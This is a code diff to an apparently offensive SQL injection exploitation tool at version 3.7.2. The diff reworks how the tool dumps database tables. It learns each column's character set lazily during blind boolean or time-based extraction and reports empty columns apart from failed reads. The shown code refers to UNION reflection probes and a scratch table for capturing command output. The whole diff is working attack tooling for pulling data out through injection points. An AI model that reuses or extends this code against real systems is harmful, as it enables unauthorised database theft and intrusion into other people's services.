@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.7.0"
+VERSION = "3.7.2"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -1048,7 +1048,7 @@ def _bin_length(oracle, query, cap):
     return lo
 
 
-def read_scalar(target, det, a, query, cap=None, charset=None, label=None):
+def read_scalar(target, det, a, query, cap=None, charset=None, charset_fn=None, label=None):
     """Extract one scalar with the detected technique (no checkpoint; for map/dump).
     `charset` restricts the per-character search to a known alphabet; `label` streams the value
     live as it is recovered, so slow (boolean/time) extraction shows progress instead of silence."""
@@ -1064,7 +1064,9 @@ def read_scalar(target, det, a, query, cap=None, charset=None, label=None):
     n = _bin_length(o, query, cap if cap is not None else a.maxlen)
     if n == 0:
         if label: print(f"    {label}: (empty)")
-        return ""
+        return ""                       # empty/NULL column: no charset learning, no extra work
+    if charset is None and charset_fn is not None:
+        charset = charset_fn()          # learn the alphabet only now that there's data to read
     if a.threads > 1 and o.kind == "boolean-based":
         with ThreadPoolExecutor(max_workers=a.threads) as ex:
             chars = list(ex.map(lambda p: o.char_confirmed(query, p, charset=charset), range(1, n + 1)))
@@ -1208,17 +1210,22 @@ def dump_mode(target, det, a):
     # is pinned) and stream each value live, so progress is visible instead of a long silence.
     smart = (not a.charset and det.oracle is not None
              and det.oracle.kind in ("boolean-based", "time-based"))
-    col_cs = {c: (learn_col_charset(target, det, a, table, c) if smart else None) for c in cols}
-    coldata, truncated = {}, []
+    coldata, empty, failed = {}, [], []
     for c in cols:
-        raw = read_scalar(target, det, a, det.dbms.q_col(table, c), charset=col_cs[c], label=c)
+        # learn the per-column charset LAZILY: read_scalar only calls this once it confirms the
+        # column has data, so an empty/NULL column costs nothing past its 1-request length probe.
+        cs_fn = (lambda cc=c: learn_col_charset(target, det, a, table, cc)) if smart else None
+        raw = read_scalar(target, det, a, det.dbms.q_col(table, c), charset_fn=cs_fn, label=c)
         coldata[c] = raw.split(",") if raw else []
-        if not raw:
-            truncated.append(c)
+        if raw is None:            # the read itself failed (e.g. truncated by a length cap)
+            failed.append(c)
+        elif raw == "":            # the query ran fine; the column is just NULL / has no data
+            empty.append(c)
     # if even the per-column query was too long, drop to per-cell: the smallest read there is,
     # one value at a time (LIMIT 1 OFFSET n), stopping at the first empty row.
     if not any(coldata.values()) and det.dbms.name in ("postgresql", "mysql"):
         print("[*] per-column query still too long for the cap — per-cell extraction ...", flush=True)
+        col_cs = {c: (learn_col_charset(target, det, a, table, c) if smart else None) for c in cols}
         rows = []
         for off in range(a.max_rows):
             cells = [read_scalar(target, det, a, det.dbms.q_cell(table, c, off),
@@ -1227,7 +1234,7 @@ def dump_mode(target, det, a):
                 break
             rows.append(cells)
         coldata = {c: [r[j] for r in rows] for j, c in enumerate(cols)}
-        truncated = []
+        empty, failed = [], []
     nrows = min(max((len(v) for v in coldata.values()), default=0), a.max_rows)
     print(f"rows: {nrows}")
     if nrows == 0:
@@ -1241,9 +1248,11 @@ def dump_mode(target, det, a):
     print("-+-".join("-" * w for w in widths))
     for r in rows:
         print(line(r))
-    if truncated:
-        print(f"\n[!] too long for the cap (came back empty): {', '.join(truncated)} "
-              f"— pull these with a targeted --query.")
+    if empty:
+        print(f"\n[i] empty / NULL for every row (the column has no data): {', '.join(empty)}")
+    if failed:
+        print(f"\n[!] came back empty, likely too long for the injection point's length cap: "
+              f"{', '.join(failed)} — pull these with a targeted --query.")
 
 
 # ===========================================================================
